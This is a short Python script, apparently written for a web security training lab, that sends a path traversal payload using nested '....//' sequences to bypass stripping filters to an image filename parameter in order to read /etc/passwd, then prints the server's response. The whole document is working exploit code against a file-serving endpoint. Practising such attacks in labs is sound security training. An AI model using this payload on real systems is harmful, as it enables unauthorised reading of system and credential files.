import requests

payload = "....//....//....//etc/passwd"
url = "https://aca21f471f092825c0c6e954004e00ac.web-security-academy.net/image?filename=" + payload

response = requests.get(url)

print(response.text)